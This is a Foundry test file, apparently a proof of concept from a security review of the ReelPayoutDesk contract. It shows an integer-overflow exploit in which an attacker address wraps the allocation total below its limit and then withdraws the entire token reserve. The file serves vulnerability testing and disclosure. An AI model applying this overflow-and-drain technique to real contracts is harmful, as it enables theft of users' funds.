// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/ReelPayoutDesk.sol";
import "../src/PayoutOrderLib.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Thin wrapper used only to keep the PoC short; no protocol logic is changed.
contract ReelPayoutDeskHarness is ReelPayoutDesk {
    constructor(address _owner, address _authority, address _token)
        ReelPayoutDesk(_owner, _authority, _token) {}

    function exposeAllocateFunds(address creator, uint256 amount) external {
        _allocateFunds(creator, amount);
    }
}

contract AllocateOverflowTest is Test {
    uint256 constant RESERVE = 250_000 ether;

    ReelPayoutDeskHarness desk;
    MockToken token;
    address owner = makeAddr("owner");
    address authority = makeAddr("authority");
    address funder = makeAddr("funder");
    address creator = makeAddr("creator");
    address attacker = makeAddr("attacker");

    function setUp() public {
        token = new MockToken();
        desk = new ReelPayoutDeskHarness(owner, authority, address(token));

        token.mint(funder, RESERVE);
        vm.startPrank(funder);
        token.approve(address(desk), RESERVE);
        desk.fundReserve(RESERVE);
        vm.stopPrank();

        // an existing creator allocation of 1,000 tokens
        desk.exposeAllocateFunds(creator, 1_000 ether);
    }

    function test_allocateOverflowDrainsReserve() public {
        assertEq(desk.totalAllocated(), 1_000 ether);

        // 1,000e18 + (2**256 - 400e18) wraps to 600e18
        uint256 hugeAmount = type(uint256).max - 400 ether + 1;
        vm.prank(attacker);
        desk.exposeAllocateFunds(attacker, hugeAmount);

        console2.log("totalAllocated after wrap:", desk.totalAllocated());
        console2.log("issuanceLimit            :", desk.issuanceLimit());
        console2.log("attacker desk balance    :", desk.balanceOf(attacker));

        assertEq(desk.totalAllocated(), 600 ether, "totalAllocated wrapped");
        assertLt(desk.totalAllocated(), desk.issuanceLimit(), "still under the limit");
        assertEq(desk.balanceOf(attacker), hugeAmount, "attacker balance is huge");

        // attacker withdraws the entire reserve
        vm.prank(attacker);
        desk.withdraw(RESERVE);

        console2.log("attacker token balance   :", token.balanceOf(attacker));
        console2.log("desk reserve             :", token.balanceOf(address(desk)));

        assertEq(token.balanceOf(attacker), RESERVE, "attacker took the reserve");
        assertEq(token.balanceOf(address(desk)), 0, "reserve is empty");
    }
}
